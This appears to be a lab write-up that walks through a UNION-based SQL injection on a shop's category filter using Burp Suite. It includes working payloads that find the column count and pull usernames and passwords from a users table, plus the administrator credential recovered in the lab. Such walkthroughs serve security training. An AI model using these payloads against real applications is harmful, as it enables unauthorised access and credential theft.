---
custom_edit_url: null
sidebar_position: 9
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/3cfad11f-6a08-4cc1-8185-b88a11cd6a8b)
</figure>

Let's filter for `Gifts`.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/cae865d8-750d-4800-aee1-d8f7424311df)
</figure>

Since we are proxying the traffic through Burp Suite, we can go to the `Proxy > HTTP History` tab to view this request.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/aff85411-e3c1-422d-ab12-435da1f73c54)
</figure>

Let's forward this request to the `Repeater` for further modification.

Once in the `Repeater`, let's set the `category` parameter to the following:

```
' UNION SELECT 'test'--
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/0a9c1fad-0536-423e-afd7-fcac89e195bf)
</figure>

Since the application returns an error, we know that the number of columns in the current query is more than 1.

Let's set the `category` parameter to the following:

```
' UNION SELECT 'test', 'test'--
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/b144fc6f-811c-4091-abb9-de60007bc748)
</figure>

Now that we know the current query has two columns, we can retrieve the usernames and password from the `username` and `password` columns respectively.

```
' UNION SELECT username, password FROM users--
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/455832c1-73cb-4afd-85e1-9d46ad0e686c)
</figure>

We can now login as the admin using the following credentials:


| Username | Password |
| -------- | -------- |
| administrator         | 21tpnvx8ho5pyej8z6sy         |

<figure style={{ textAlign: 'center' }}>
![7](https://github.com/Knign/Write-ups/assets/110326359/dfc9a45a-d8b3-4fbd-acee-ecd256c0a2cf)
</figure>


We have solved the lab.

<figure style={{ textAlign: 'center' }}>
![88](https://github.com/Knign/Write-ups/assets/110326359/c3c657b2-2c77-4ea2-8712-651f1fb77886)
</figure>
